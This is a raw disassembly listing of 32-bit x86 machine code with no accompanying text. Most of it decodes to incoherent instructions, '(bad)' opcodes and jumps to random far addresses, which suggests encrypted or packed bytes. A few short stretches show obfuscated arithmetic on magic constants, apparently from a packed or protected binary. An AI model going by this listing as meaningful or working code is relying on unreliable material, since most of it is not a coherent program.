  405259:	dec    ebp
  40525a:	stc    
  40525b:	ret    0x674f
  40525e:	scas   al,BYTE PTR es:[edi]
  40525f:	repnz pop esp
  405261:	rcr    BYTE PTR [ebp-0x4],cl
  405264:	ret    
  405265:	or     DWORD PTR [esi],ecx
  405267:	inc    ebp
  405268:	cs sti 
  40526a:	stos   BYTE PTR es:[edi],al
  40526b:	push   es
  40526c:	pop    ecx
  40526d:	jmp    0x5bcd1f3c
  405272:	pop    ss
  405273:	xchg   ecx,eax
  405274:	push   edx
  405275:	cmp    al,0x82
  405277:	pop    ebx
  405278:	ficomp DWORD PTR [ebx]
  40527a:	scas   al,BYTE PTR es:[edi]
  40527b:	addr16 jo 0x4052ac
  40527e:	repz jmp 0xa69f:0x79167bc8
  405286:	dec    ebx
  405287:	fidiv  DWORD PTR [ecx+ecx*1-0x3f]
  40528b:	add    al,0x84
  40528d:	push   edx
  40528e:	adc    esi,esp
  405290:	dec    ecx
  405291:	pusha  
  405292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405293:	scas   eax,DWORD PTR es:[edi]
  405294:	mov    edx,0x3bfa4ea7
  405299:	xor    DWORD PTR [ebx-0x11],eax
  40529c:	jb     0x405237
  40529e:	adc    BYTE PTR [esi+0x77a750ba],bh
  4052a4:	(bad)  
  4052a5:	stos   DWORD PTR es:[edi],eax
  4052a6:	stc    
  4052a7:	mov    bl,0xe3
  4052a9:	ins    DWORD PTR es:[edi],dx
  4052aa:	xchg   esi,eax
  4052ab:	imul   esi,esi,0x37
  4052ae:	loope  0x405275
  4052b0:	push   es
  4052b1:	mov    BYTE PTR [esi-0x28d57f3a],dh
  4052b7:	push   edi
  4052b8:	xchg   ebx,eax
  4052b9:	and    DWORD PTR [esi-0x79a49f11],ebp
  4052bf:	mov    bh,0x2c
  4052c1:	imul   esi
  4052c3:	je     0x405310
  4052c5:	scas   al,BYTE PTR es:[edi]
  4052c6:	xlat   BYTE PTR ds:[ebx]
  4052c7:	loop   0x4052d3
  4052c9:	inc    esi
  4052ca:	call   0xca2e:0xaf24420a
  4052d1:	sub    edi,esi
  4052d3:	mov    ebp,0x2429e4ad
  4052d8:	fnsave [esp+edx*2-0x2d]
  4052dc:	jle    0x40534d
  4052de:	dec    ebx
  4052df:	int    0x33
  4052e1:	adc    al,0x57
  4052e3:	pop    esp
  4052e4:	sbb    BYTE PTR [ebx],ah
  4052e6:	push   ebx
  4052e7:	out    dx,eax
  4052e8:	in     al,0x32
  4052ea:	pop    es
  4052eb:	retf   0x5d45
  4052ee:	cmc    
  4052ef:	repz scas eax,DWORD PTR es:[edi]
  4052f1:	mov    esi,0xb78f1809
  4052f6:	inc    edx
  4052f7:	ret    0x5c1e
  4052fa:	stos   BYTE PTR es:[edi],al
  4052fb:	inc    ecx
  4052fc:	adc    al,0x1
  4052fe:	mov    BYTE PTR [edx],al
  405300:	xchg   edx,eax
  405301:	push   ecx
  405302:	retf   
  405303:	stc    
  405304:	push   es
  405305:	out    dx,al
  405306:	mov    BYTE PTR [esi+0x2c80cee5],ch
  40530c:	mov    bh,0x84
  40530e:	aas    
  40530f:	leave  
  405310:	push   esp
  405311:	jge    0x40538a
  405313:	mov    ecx,0xf365eb8b
  405318:	mov    edx,0xd4dee278
  40531d:	mov    ds:0x749861f8,al
  405322:	xchg   DWORD PTR [esi],ebp
  405324:	in     al,0x7b
  405326:	aaa    
  405327:	inc    esp
  405328:	fld    DWORD PTR [ebx]
  40532a:	push   eax
  40532b:	cld    
  40532c:	push   edx
  40532d:	xchg   edi,eax
  40532e:	(bad)  
  405330:	adc    eax,DWORD PTR [esp+eiz*8]
  405333:	xchg   ebp,eax
  405334:	add    eax,0x97d3772
  405339:	xor    DWORD PTR [edx+0xd],esi
  40533c:	add    bl,ah
  40533e:	shr    cl,cl
  405340:	inc    ecx
  405341:	cmp    BYTE PTR [edx*1-0x2526aad2],ch
  405348:	fs mov cl,0x33
  40534b:	or     DWORD PTR [ecx+0x7c],esp
  40534e:	lahf   
  40534f:	or     eax,0x37811c8c
  405354:	loope  0x405327
  405356:	aad    0xc1
  405358:	push   edi
  405359:	out    0xb8,al
  40535b:	loopne 0x40536c
  40535d:	mov    cl,bh
  40535f:	mov    dl,0xaa
  405361:	xchg   esp,eax
  405362:	jb     0x4053d7
  405364:	mov    ds:0x3f33f723,eax
  405369:	sub    edx,DWORD PTR [eax+0x16]
  40536c:	xchg   ebx,eax
  40536d:	(bad)  
  40536e:	test   DWORD PTR [ebx+eax*8+0x5552c15b],0xfb3a01af
  405379:	ins    BYTE PTR es:[edi],dx
  40537a:	jg     0x405359
  40537c:	nop
  40537d:	sbb    DWORD PTR [edi-0xee480dc],0xffffff9a
  405384:	adc    DWORD PTR [ecx+0x24208881],0xfb8934ce
  40538e:	xchg   ebp,eax
  40538f:	xchg   esp,eax
  405390:	arpl   WORD PTR ds:0x94b4031c,ax
  405396:	xchg   esi,eax
  405397:	sti    
  405398:	aas    
  405399:	and    DWORD PTR [ebp-0x450bdc1],esi
  40539f:	aam    0xbc
  4053a1:	(bad)  
  4053a2:	das    
  4053a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a4:	push   ebp
  4053a5:	(bad)  
  4053a6:	pop    ecx
  4053a7:	retf   
  4053a8:	rcl    BYTE PTR [edi],cl
  4053aa:	mov    ecx,DWORD PTR [eax-0x6d]
  4053ad:	pop    esp
  4053ae:	adc    BYTE PTR [ebp-0x7d],0x25
  4053b2:	test   DWORD PTR [edi+0x52136e1f],0x1540812e
  4053bc:	(bad)  
  4053bd:	(bad)  
  4053bf:	push   ebp
  4053c0:	push   ecx
  4053c1:	lahf   
  4053c2:	cmp    al,0x9b
  4053c4:	xor    BYTE PTR [esi],dh
  4053c6:	(bad)  
  4053c7:	sub    DWORD PTR [ebp+0x40],esi
  4053ca:	outs   dx,BYTE PTR ds:[esi]
  4053cb:	loope  0x4053b2
  4053cd:	enter  0x8ae0,0xc7
  4053d1:	aaa    
  4053d2:	das    
  4053d3:	in     al,0xe3
  4053d5:	xchg   esi,eax
  4053d6:	rcl    edx,1
  4053d8:	add    al,0x8f
  4053da:	test   ecx,0x2f854df9
  4053e0:	ja     0x4053bf
  4053e2:	inc    ebp
  4053e3:	and    esi,DWORD PTR [edi+0x55]
  4053e6:	lahf   
  4053e7:	or     eax,0xe5f634ea
  4053ec:	mov    eax,0x6a61ec90
  4053f1:	mov    al,ds:0xeee1c8e0
  4053f6:	mov    al,ds:0x3d65f5ab
  4053fb:	or     al,0x31
  4053fd:	aaa    
  4053fe:	pop    ds
  4053ff:	push   ds
  405400:	js     0x405435
  405402:	lock clc 
  405404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405405:	cdq    
  405406:	and    BYTE PTR [eax],dh
  405408:	popf   
  405409:	movups XMMWORD PTR [esi-0x28285f86],xmm7
  405410:	pop    ecx
  405411:	out    dx,eax
  405412:	leave  
  405413:	sar    DWORD PTR ds:0xb4ce81e0,0x0
  40541a:	leave  
  40541b:	dec    esi
  40541c:	pop    DWORD PTR [edx-0x53966de1]
  405422:	mov    edx,ebx
  405424:	jle    0x40541d
  405426:	std    
  405427:	and    ecx,edi
  405429:	mov    dh,0x30
  40542b:	inc    ebp
  40542c:	fs and eax,0xe6bd3758
  405432:	fst    DWORD PTR [ecx+edx*1]
  405435:	sti    
  405436:	ins    BYTE PTR es:[edi],dx
  405437:	mov    edx,0x8187c9f9
  40543c:	jo     0x4054af
  40543e:	inc    ecx
  40543f:	or     eax,0xdc738d2a
  405444:	mov    dl,0x4d
  405446:	jecxz  0x405481
  405448:	dec    edi
  405449:	sti    
  40544a:	adc    DWORD PTR [eax+0x21],esp
  40544d:	popa   
  40544e:	mov    ebp,0x1920cc1a
  405453:	push   esi
  405454:	mov    bl,0xb1
  405456:	jl     0x4053ed
  405458:	push   ecx
  405459:	pop    esi
  40545a:	xor    cl,dl
  40545c:	cdq    
  40545d:	xor    cl,0xe0
  405460:	mov    ch,0xb5
  405462:	cld    
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x7a38fbb8]
  405484:	sub    DWORD PTR [ebx+0x7e7e2bd0],0x58
  40548b:	jl     0x40550b
  40548d:	jle    0x405424
  40548f:	jae    0x405486
  405491:	push   edx
  405492:	xchg   edx,eax
  405493:	js     0x405437
  405495:	out    dx,al
  405496:	in     al,0x63
  405498:	sbb    ebx,DWORD PTR [edi-0x6a4b7b15]
  40549e:	out    0x78,al
  4054a0:	push   0x51
  4054a2:	xlat   BYTE PTR ds:[ebx]
  4054a3:	xchg   DWORD PTR [esi+0x54316b71],esp
  4054a9:	enter  0x756b,0x2c
  4054ad:	popf   
  4054ae:	pop    ss
  4054af:	dec    ecx
  4054b0:	mov    al,0x8b
  4054b2:	add    edx,DWORD PTR [edi-0x42a7e94a]
  4054b8:	sub    dh,dh
  4054ba:	mov    al,bh
  4054bc:	sahf   
  4054bd:	xlat   BYTE PTR ds:[ebx]
  4054be:	les    esp,FWORD PTR [eax-0x58]
  4054c1:	fdivp  st(1),st
  4054c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054c4:	inc    esi
  4054c5:	mov    ebx,ss
  4054c7:	lds    eax,FWORD PTR [ebx-0x38]
  4054ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054cb:	pop    ecx
  4054cc:	loop   0x4054a7
  4054ce:	sub    ecx,DWORD PTR [ecx]
  4054d0:	mov    esp,0x6caf4ae3
  4054d5:	push   ebx
  4054d6:	inc    edx
  4054d7:	cli    
  4054d8:	and    DWORD PTR [ebp+ebp*4+0x37],esi
  4054dc:	call   0x2906:0x41f2dd31
  4054e3:	aas    
  4054e4:	xor    al,0xad
  4054e6:	push   0x9195f9d2
  4054eb:	pusha  
  4054ec:	jne    0x40556a
  4054ee:	leave  
  4054ef:	dec    eax
  4054f0:	add    eax,0x5bc0afd3
  4054f5:	ins    DWORD PTR es:[edi],dx
  4054f6:	pop    esi
  4054f7:	idiv   DWORD PTR [ebp-0x21]
  4054fa:	add    BYTE PTR [ebx+0x2980d3f7],bh
  405500:	lods   al,BYTE PTR ds:[esi]
  405501:	mov    ch,0x2c
  405503:	out    0xb2,al
  405505:	or     ah,BYTE PTR [edx+edx*4-0x53de409a]
  40550c:	aaa    
  40550d:	add    DWORD PTR [edi+0x1faeed7a],ebx
  405513:	inc    ebp
  405514:	fist   DWORD PTR [esi-0x3245291a]
  40551a:	sub    BYTE PTR [edi+0x66889886],ah
  405520:	loopne 0x405531
  405522:	dec    ecx
  405523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405524:	(bad)  
  405525:	jb     0x4054d3
  405527:	xchg   ebx,eax
  405528:	inc    ecx
  405529:	and    ecx,DWORD PTR [ebx-0x4e53b46f]
  40552f:	jle    0x4054cc
  405531:	adc    al,BYTE PTR [ebx+0x46]
  405534:	test   BYTE PTR [eax-0x43c37f4b],ch
  40553a:	mov    ds,ebp
  40553c:	and    edx,DWORD PTR [ebx]
  40553e:	mov    al,ds:0xdb78f45b
  405543:	fs (bad) 
  405545:	cmp    al,0xa
  405547:	xchg   edi,eax
  405548:	jnp    0x405574
  40554a:	je     0x40553e
  40554c:	popa   
  40554d:	shl    DWORD PTR [ebx-0x25],0x9e
  405551:	mov    ecx,0x2b961777
  405556:	cld    
  405557:	leave  
  405558:	sbb    DWORD PTR [eax+edi*1+0x56],ebx
  40555c:	fwait
  40555d:	aas    
  40555e:	push   esi
  40555f:	jg     0x40551e
  405561:	fucomi st,st(1)
  405563:	mov    edx,0x61e78142
  405568:	push   cs
  405569:	jecxz  0x40555e
  40556b:	pop    ebx
  40556c:	xchg   ecx,eax
  40556d:	shl    DWORD PTR [eax],cl
  40556f:	and    ah,BYTE PTR [ebp-0x4d]
  405572:	(bad)  
  405573:	call   0x48de:0x4250dff0
  40557a:	jg     0x40558d
  40557c:	das    
  40557d:	rol    BYTE PTR [edx-0x7f],cl
  405580:	or     eax,0x5cca90bc
  405585:	and    DWORD PTR ds:[esi+0x50],ebp
  405589:	xchg   edi,eax
  40558a:	ins    BYTE PTR es:[edi],dx
  40558b:	(bad)  
  40558c:	jmp    0xe9d1:0xaa6a66ab
  405593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405594:	dec    edx
  405595:	and    eax,ebp
  405597:	or     BYTE PTR [edi-0x69e3e2c6],dh
  40559d:	lds    ebx,FWORD PTR [edi]
  40559f:	pushf  
  4055a0:	in     eax,0x11
  4055a2:	fist   DWORD PTR [eax+0x3ee092e0]
  4055a8:	mov    DWORD PTR [ecx],edx
  4055aa:	and    DWORD PTR [ebp+ebx*4-0x4f],ebp
  4055ae:	adc    ch,BYTE PTR [eax]
  4055b0:	adc    dh,bh
  4055b2:	or     bh,BYTE PTR [ebp+0x1f166fd7]
  4055b8:	mov    bh,0xa6
  4055ba:	retf   
  4055bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055bc:	cld    
  4055bd:	inc    esp
  4055be:	mov    eax,0xe1bf8d86
  4055c3:	jmp    0x40563c
  4055c5:	push   0x1a7f5c1d
  4055ca:	xor    al,0x73
  4055cc:	mov    ecx,0x28f979d0
  4055d1:	ficom  WORD PTR [ecx+0x35532909]
  4055d7:	ds stos BYTE PTR es:[edi],al
  4055d9:	and    al,0x0
  4055db:	mov    BYTE PTR [ebp+0x4c],cl
  4055de:	sub    esi,ebx
  4055e0:	call   0xeaa8:0x3dbed155
  4055e7:	dec    edx
  4055e8:	push   eax
  4055e9:	dec    eax
  4055ea:	sub    al,0xa1
  4055ec:	(bad)  
  4055ed:	push   eax
  4055ee:	test   DWORD PTR [eax],0xa3bb9f6c
  4055f4:	adc    DWORD PTR [ebx+0x729d7433],ebx
  4055fa:	in     eax,dx
  4055fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055fc:	add    dh,ah
  4055fe:	adc    dh,cl
  405600:	int3   
  405601:	in     eax,dx
  405602:	mov    dl,0x56
  405604:	push   ebp
  405605:	in     eax,0x26
  405607:	and    DWORD PTR [eax+0x1c],ecx
  40560a:	sub    al,0x7d
  40560c:	and    eax,0x1651b6ae
  405611:	sbb    ah,ah
  405613:	mov    al,0xe7
  405615:	gs dec eax
  405617:	nop
  405618:	retf   
  405619:	loopne 0x40564a
  40561b:	sub    al,0x41
  40561d:	dec    ebp
  40561e:	jge    0x40568e
  405620:	mov    ebx,0xf44bcc31
  405625:	call   0x1e442924
  40562a:	fucomip st,st(5)
  40562c:	imul   eax,DWORD PTR [ebx-0x68af76b],0xffffffce
  405633:	jae    0x40567c
  405635:	cld    
  405636:	inc    esi
  405637:	pusha  
  405638:	sti    
  405639:	fcmovu st,st(3)
  40563b:	std    
  40563c:	dec    edi
  40563d:	xchg   esp,edi
  40563f:	adc    dh,BYTE PTR [edx+eax*8]
  405642:	cli    
  405643:	push   cs
  405644:	add    eax,0xb17cf4df
  405649:	call   0xbf75f9ce
  40564e:	fidivr WORD PTR [ecx+0x9caaa35]
  405654:	out    0x6e,eax
  405656:	scas   eax,DWORD PTR es:[edi]
  405657:	dec    ebx
  405658:	jmp    0x2ab2e578
  40565d:	xchg   BYTE PTR [edx+0x67],cl
  405660:	mov    WORD PTR [edx],cs
  405662:	call   0x29a3a0fa
  405667:	mov    esp,0xfa9e7d07
  40566c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40566d:	dec    ebx
  40566e:	sti    
  40566f:	lods   al,BYTE PTR ds:[esi]
  405670:	ret    
  405671:	mov    esp,0xaa03bf0b
  405676:	add    BYTE PTR [esi],ch
  405678:	retf   
  405679:	jg     0x4056bb
  40567b:	fsub   DWORD PTR [ebp+0x5944df6a]
  405681:	sub    BYTE PTR [ecx],bh
  405683:	mov    al,0x89
  405685:	mov    cl,0xac
  405687:	ret    
  405688:	mov    DWORD PTR [esi],ecx
  40568a:	and    bh,BYTE PTR [eax-0x7454b7b3]
  405690:	pop    esi
  405691:	inc    edi
  405692:	mov    sp,0x3915
  405696:	push   edx
  405697:	mov    dl,0xd9
  405699:	push   cs
  40569a:	iret   
  40569b:	xchg   edx,eax
  40569c:	hlt    
  40569d:	je     0x40562d
  40569f:	jnp    0x405690
  4056a1:	int    0x5e
  4056a3:	dec    edi
  4056a4:	sub    bl,ah
  4056a6:	or     al,0xb3
  4056a8:	dec    esi
  4056a9:	push   edx
  4056aa:	or     DWORD PTR [ebp+edx*8-0x3feb80c3],edx
  4056b1:	repz shr BYTE PTR [edi],1
  4056b4:	adc    eax,0x3876559
  4056b9:	adc    ebp,eax
  4056bb:	call   0x41c7f423
  4056c0:	push   0xffffff8e
  4056c2:	fisttp WORD PTR [ecx+0x487aa555]
  4056c8:	xor    al,0xbd
  4056ca:	mov    es,WORD PTR [edi+ebp*2+0x56]
  4056ce:	xchg   edx,eax
  4056cf:	jle    0x4056dd
  4056d1:	jbe    0x405736
  4056d3:	or     edi,esi
  4056d5:	repz pop edx
  4056d7:	mov    al,0x5c
  4056d9:	sub    BYTE PTR [edx],cl
  4056db:	adc    edi,DWORD PTR [ecx]
  4056dd:	leave  
  4056de:	jbe    0x405676
  4056e0:	hlt    
  4056e1:	rcr    DWORD PTR [edi+ecx*8],0xf5
  4056e5:	mov    ah,0x54
  4056e7:	jecxz  0x40572f
  4056e9:	dec    edi
  4056ea:	xchg   ebx,eax
  4056eb:	(bad)  
  4056ec:	push   edx
  4056ed:	xchg   esp,eax
  4056ee:	inc    ebp
  4056ef:	imul   eax,DWORD PTR [ebp+esi*8-0x1049796f],0x3919e234
  4056fa:	das    
  4056fb:	or     DWORD PTR [esi+0x3981f3b5],esi
  405701:	xchg   eax,ecx
  405703:	cmp    al,0xba
  405705:	shl    DWORD PTR [edi-0x10b1fa7c],cl
  40570b:	sbb    DWORD PTR [esp+eiz*4+0x2c],ecx
  40570f:	jle    0x4056ef
  405711:	cmp    bh,ah
  405713:	into   
  405714:	mov    ecx,0x9407ec3e
  405719:	mov    DWORD PTR [ebx-0x3068c50],edx
  40571f:	dec    esi
  405720:	addr16 daa 
  405722:	jns    0x4056ce
  405724:	imul   ebx,DWORD PTR [ebp-0x4ccaa5b4],0xffffffe2
  40572b:	outs   dx,BYTE PTR ds:[esi]
  40572c:	xchg   DWORD PTR [eax+0x70],esp
  40572f:	push   edi
  405730:	pop    edi
  405731:	outs   dx,DWORD PTR ds:[esi]
  405732:	jl     0x4056d1
  405734:	sti    
  405735:	dec    esp
  405736:	mov    ds:0xb57ce119,eax
  40573b:	mov    al,0x9c
  40573d:	je     0x405733
  40573f:	cmp    eax,0xcefbfdd5
  405744:	push   esp
  405745:	jl     0x405768
  405747:	xor    al,0x44
  405749:	xchg   edi,eax
  40574a:	enter  0xc978,0x2c
  40574e:	mov    dl,0x5a
  405750:	pop    edx
  405751:	jg     0x4056f8
  405753:	and    DWORD PTR [ebx-0x496f7f3d],edi
  405759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40575a:	pop    esp
  40575b:	and    BYTE PTR [ebx+edx*1],ah
  40575e:	shl    BYTE PTR [edi],0x58
  405761:	inc    esp
  405762:	pop    esp
  405763:	in     al,dx
  405764:	adc    eax,0xa111bd10
  405769:	mov    bl,0xe9
  40576b:	bound  esp,QWORD PTR ds:0xc6bdeb84
  405771:	fist   WORD PTR [esp+edi*1-0x2efc2fcd]
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43389b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4337a3,0x433783
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4337df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xb2
  4057f5:	out    dx,al
  4057f6:	in     eax,0x5b
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	fsubr  st,st(0)
  405802:	xchg   edi,eax
  405803:	call   0xc76e:0xc50fb078
  40580a:	cmp    BYTE PTR [esi],bh
  40580c:	mov    BYTE PTR [esi+0x3],cl
  40580f:	and    dl,BYTE PTR [ebx+edx*8-0x6a]
  405813:	mov    cs:0xbf535a44,al
  405819:	jb     0x405860
  40581b:	ja     0x405869
  40581d:	sbb    bl,BYTE PTR [edi]
  40581f:	fcmovne st,st(7)
  405821:	inc    eax
  405822:	(bad)
  405825:	and    cl,dh
  405827:	sbb    al,BYTE PTR [edi+0x3aab9aaa]
  40582d:	inc    edx
  40582e:	push   esi
  40582f:	push   ecx
  405830:	mov    edx,0x258d3e4c
  405835:	imul   esp,DWORD PTR [eax+esi*8-0x7c],0x22ba7e1e
  40583d:	mov    edi,0xbb313ba5
  405842:	push   edi
  405843:	out    dx,eax
  405844:	out    0xd3,al
  405846:	jmp    0x4057dd
  405848:	push   edi
  405849:	jno    0x40583c
  40584b:	pop    ss
  40584c:	cli    
  40584d:	mov    eax,0xe78ea5f2
  405852:	ss add eax,0xaa3f1fda
  405858:	mov    al,ds:0x4d8f3fe0
  40585d:	repz add edi,DWORD PTR [eax+0x63d90c7d]
  405864:	(bad)  
  405865:	call   0x5a9d34aa
  40586a:	inc    eax
  40586b:	(bad)  
  40586c:	outs   dx,BYTE PTR ds:[esi]
  40586d:	jo     0x405876
  40586f:	mov    ebx,0xebadbf9
  405874:	xor    al,BYTE PTR [edi-0x62f21d25]
  40587a:	mov    al,ds:0x50161d46
  40587f:	push   ebp
  405880:	inc    ebp
  405881:	je     0x4058c3
  405883:	xor    BYTE PTR [edi-0x2e9e4b27],0x2a
  40588a:	push   0xffffff8c
  40588c:	retf   
  40588d:	retf   0x16ae
  405890:	jecxz  0x4058ab
  405892:	inc    ebx
  405893:	adc    eax,0x6f9622e3
  405898:	in     eax,dx
  405899:	in     eax,dx
  40589a:	lods   al,BYTE PTR ds:[esi]
  40589b:	dec    esi
  40589c:	jmp    FWORD PTR [eax-0x71e36d41]
  4058a2:	pop    esp
  4058a3:	cwde   
  4058a4:	sub    al,0xf0
  4058a6:	or     dl,bl
  4058a8:	mov    ebx,0xe7741
  4058ad:	adc    eax,0x224b1af8
  4058b2:	out    dx,eax
  4058b3:	ss pop ebp
  4058b5:	add    DWORD PTR [ebx+0x21],0xffffff96
  4058b9:	adc    bh,cl
  4058bb:	daa    
  4058bc:	sbb    ebp,ebp
  4058be:	dec    ebx
  4058bf:	pop    ecx
  4058c0:	adc    esi,esp
  4058c2:	stc    
  4058c3:	jl     0x4058c7
  4058c5:	and    ebp,ecx
  4058c7:	xor    eax,0x1d7672ef
  4058cc:	mov    BYTE PTR [edi+0x5e2d7b49],dl
  4058d2:	stos   BYTE PTR es:[edi],al
  4058d3:	dec    eax
  4058d4:	mov    ch,0xdf
  4058d6:	inc    ecx
  4058d7:	enter  0x2b5,0xf3
  4058db:	ins    DWORD PTR es:[edi],dx
  4058dc:	cwde   
  4058dd:	sub    DWORD PTR [ecx-0x23],0x6bbedcbc
  4058e4:	bound  ebx,QWORD PTR [esi]
  4058e6:	or     BYTE PTR [ebx-0x64851711],al
  4058ec:	mov    gs,WORD PTR [edi-0x3]
  4058ef:	sbb    al,0xd3
  4058f1:	int    0x1a
  4058f3:	mov    DWORD PTR [eax*4-0x38d3f586],ebp
  4058fa:	jle    0x4058df
  4058fc:	sub    BYTE PTR [edi-0x793b08c9],bh
  405902:	fsubr  DWORD PTR [esi+ebx*4-0x5cc61d9e]
  405909:	fistp  DWORD PTR [eax+edx*1-0x52373c9d]
  405910:	scas   eax,DWORD PTR es:[edi]
  405911:	and    DWORD PTR ds:0xf180f298,esp
  405917:	into   
  405918:	(bad)  [edi+0x53]
  40591b:	add    eax,0x798a1465
  405920:	in     eax,dx
  405921:	sti    
  405922:	jmp    0x6166:0x7b4c2466
  405929:	mov    esi,0x40311b13
  40592e:	sub    esi,ebp
  405930:	push   eax
  405931:	mov    ecx,0x74a30b36
  405936:	ins    BYTE PTR es:[edi],dx
  405937:	arpl   WORD PTR [edx+0x4ed3d167],di
  40593d:	js     0x4058eb
  40593f:	pop    eax
  405940:	scas   eax,DWORD PTR es:[edi]
  405941:	xor    edx,esi
  405943:	call   0xe9960d7a
  405948:	push   edx
  405949:	aas    
  40594a:	dec    ecx
  40594b:	stos   DWORD PTR es:[edi],eax
  40594c:	jl     0x405932
  40594e:	pop    esi
  40594f:	or     DWORD PTR [esi-0x2cbf2ceb],esi
  405955:	xchg   ch,bh
  405957:	dec    ebx
  405958:	and    eax,0x59c907d1
  40595d:	inc    ebp
  40595e:	neg    ecx
  405960:	pop    esi
  405961:	ja     0x4059b7
  405963:	and    esi,edx
  405965:	repz out dx,eax
  405967:	test   eax,0x18832185
  40596c:	mov    fs,WORD PTR [edi]
  40596e:	jbe    0x4059ac
  405970:	mov    esp,0x5bce8be1
  405975:	aam    0x71
  405977:	mov    al,ds:0xc0e1f931
  40597c:	outs   dx,DWORD PTR ds:[esi]
  40597d:	sub    eax,0x89789ee0
  405982:	sub    dh,BYTE PTR [ecx]
  405984:	mov    ebx,0x20621e40
  405989:	mov    BYTE PTR [edi+0x49],ch
  40598c:	pop    es
  40598d:	jecxz  0x405941
  40598f:	push   ebx
  405990:	mov    BYTE PTR ds:0x4a9aad54,al
  405996:	ds enter 0x5d5b,0xdc
  40599b:	iret   
  40599c:	xchg   DWORD PTR ds:0x73a171d1,edx
  4059a2:	dec    ecx
  4059a3:	fbstp  TBYTE PTR [ebx-0x29]
  4059a6:	test   BYTE PTR [eax],al
  4059a8:	mov    bl,dl
  4059aa:	fld    DWORD PTR [eax+0x2f86822e]
  4059b0:	sub    al,0xe8
  4059b2:	pop    ds
  4059b3:	jge    0x405a2a
  4059b5:	leave  
  4059b6:	shl    BYTE PTR [eax+edi*1],cl
  4059b9:	mov    edi,0x523a4f7a
  4059be:	retf   
  4059bf:	xchg   ecx,eax
  4059c0:	scas   al,BYTE PTR es:[edi]
  4059c1:	sub    eax,0x86fd13fe
  4059c6:	and    DWORD PTR [edx+0x61],ecx
  4059c9:	cwde   
  4059ca:	or     ch,BYTE PTR [edi]
  4059cc:	cmc    
  4059cd:	retf   
  4059ce:	lahf   
  4059cf:	adc    al,0xff
  4059d1:	pop    ebx
  4059d2:	adc    ebx,edx
  4059d4:	ficomp WORD PTR [ecx-0x1a31e9d5]
  4059da:	out    0xf0,eax
  4059dc:	xchg   esi,eax
  4059dd:	sbb    DWORD PTR [ecx+0x5c59ba46],0x807e5f99
  4059e7:	add    ebp,eax
  4059e9:	leave  
  4059ea:	cs test al,0xd1
  4059ed:	mov    bl,cl
  4059ef:	and    eax,0x360c0439
  4059f4:	add    BYTE PTR [edi-0x18f57f07],al
  4059fa:	(bad)  
  4059fb:	(bad)  
  4059fd:	loop   0x405a21
  4059ff:	fcmove st,st(4)
  405a01:	call   0xf93e5f66
  405a06:	ret    0xc1c6
  405a09:	js     0x4059ad
  405a0b:	add    eax,0xea04e2a1
  405a10:	sbb    eax,0xb868c9bf
  405a15:	call   FWORD PTR [edi+0x71791ec2]
  405a1b:	adc    ecx,DWORD PTR [edi+eax*2-0x5b]
  405a1f:	cdq    
  405a20:	int    0x90
  405a22:	xchg   dl,dl
  405a24:	dec    edx
  405a25:	pop    es
  405a26:	adc    bh,BYTE PTR [ecx+0x6cbb5be3]
  405a2c:	jecxz  0x4059b8
  405a2e:	in     al,dx
  405a2f:	aaa    
  405a30:	ins    WORD PTR es:[edi],dx
  405a32:	jnp    0x405a30
  405a34:	aaa    
  405a35:	imul   esp,DWORD PTR [edi+0x663c1206],0x5d
  405a3c:	mov    esp,0x140b8c80
  405a41:	(bad)  
  405a42:	mov    esi,0x29b38f24
  405a47:	test   eax,0x782d656a
  405a4c:	aam    0xda
  405a4e:	outs   dx,BYTE PTR ds:[esi]
  405a4f:	pop    edi
  405a50:	sahf   
  405a51:	adc    eax,0x6f593047
  405a56:	xor    al,0x59
  405a58:	xchg   BYTE PTR [edi+ebp*8-0x76e7fcdc],dl
  405a5f:	mov    bh,0xb5
  405a61:	out    dx,al
